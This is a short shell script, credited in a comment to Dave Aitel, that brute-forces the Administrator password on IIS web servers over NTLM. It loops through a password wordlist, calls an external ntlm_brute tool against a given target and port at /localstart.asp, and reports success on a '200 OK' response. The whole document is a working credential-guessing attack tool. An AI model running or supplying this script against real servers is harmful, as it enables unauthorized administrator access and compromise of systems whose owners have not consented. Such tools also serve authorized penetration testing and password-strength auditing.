#!/bin/sh
#dave aitel
#does a quicky and dumby ntlm check to find Admin password on IIS machines

if [ "$2" == "" ]; then
  echo "Usage: ./do_ntlm_brute.sh target port"
  exit -1
fi

USERNAME=Administrator
WORDLIST=./password.lst
TARGET=$1
PORT=$2
SKIPTO=



for PASSWORD in  `cat $WORDLIST`  ; do
if [ "$SKIPTO" != "" ]; then
if [ "$SKIPTO" != "$PASSWORD" ]; then
#we want to skip past until we get here
continue;
fi
SKIPTO=""
fi
echo "Testing $PASSWORD"
RESULT=`./ntlm_brute $TARGET $PORT $USERNAME "$PASSWORD" /localstart.asp | grep "200 OK"`
if [ "$RESULT" != "" ]; then
  echo "Password guessed! $PASSWORD"
  exit
fi

done
